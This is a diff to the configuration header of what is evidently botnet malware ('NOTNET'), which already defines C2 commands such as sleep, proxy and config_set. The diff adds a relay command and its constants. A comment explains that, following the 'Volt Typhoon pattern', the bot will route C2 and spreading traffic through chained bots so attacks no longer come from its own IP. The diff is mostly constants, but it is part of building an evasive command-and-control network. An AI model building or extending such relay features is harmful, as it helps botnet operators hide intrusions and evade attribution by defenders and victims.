@@ -95,6 +95,7 @@
 #define CMD_SLEEP            "sleep"
 #define CMD_CONFIG_SET       "config_set"
 #define CMD_PROXY            "proxy"
+#define CMD_RELAY            "relay"
 #define CMD_PING             "ping"
 #define CMD_PONG             "pong"
 
@@ -139,5 +140,27 @@
 #define PROXY_MAX_CONNS         32
 #define PROXY_HANDSHAKE_TIMEOUT 5000    /* ms: greeting/auth/CONNECT */
 #define PROXY_TUNNEL_TIMEOUT    120000  /* ms: tunnel idle timeout */
+
+/* ── ORB-Style Relay (#91) ─────────────────────────────── */
+/* Volt Typhoon pattern: route C2/spread traffic through a chain of bots
+ * (TCP CONNECT-style forwarding between peers) so operations no longer
+ * originate from the bot's own IP. The relay server is a
+ * token-authenticated listener that accepts a one-line target spec and
+ * splices the connection to it; the relay client helpers (relay_connect /
+ * relay_probe) dial targets THROUGH a relay bot instead of directly.
+ * Single-hop relay is implemented; multi-hop chaining is planned. This
+ * is explicitly NOT a DHT — no peer discovery, no overlay (#88). Off by
+ * default; the accept thread only starts when relay_enabled=1 AND a
+ * relay_token is configured (fail-closed). RELAY_BUF_SIZE bounds tunnel
+ * buffers, RELAY_HANDSHAKE_MAX bounds the request/response line,
+ * RELAY_MAX_CONNS caps concurrent worker threads, and the timeouts bound
+ * handshake/tunnel I/O so a stuck client cannot block the bot. */
+#define RELAY_DEFAULT_PORT      1081
+#define RELAY_DEFAULT_ENABLED   0
+#define RELAY_BUF_SIZE          4096
+#define RELAY_HANDSHAKE_MAX     512     /* max relay request/response line */
+#define RELAY_MAX_CONNS         32
+#define RELAY_HANDSHAKE_TIMEOUT 5000    /* ms: auth + target connect */
+#define RELAY_TUNNEL_TIMEOUT    120000  /* ms: tunnel idle timeout */
 
 #endif /* NOTNET_CONFIG_H */
